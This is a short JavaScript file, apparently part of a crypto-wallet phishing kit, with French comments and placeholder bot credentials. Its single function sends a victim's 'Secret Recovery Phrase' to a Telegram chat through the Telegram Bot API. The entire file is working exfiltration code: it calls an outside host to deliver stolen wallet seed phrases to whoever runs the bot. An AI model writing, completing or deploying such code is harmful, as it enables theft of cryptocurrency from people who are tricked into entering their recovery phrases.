// telegram.js

const botToken = "YOUR_BOT_TOKEN_HERE";  // Remplace par ton token
const chatId = "YOUR_CHAT_ID_HERE";      // Remplace par ton chat ID

function sendSecretPhrase(phrase) {
  return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: "Secret Recovery Phrase:\n" + phrase.trim()
    })
  });
}
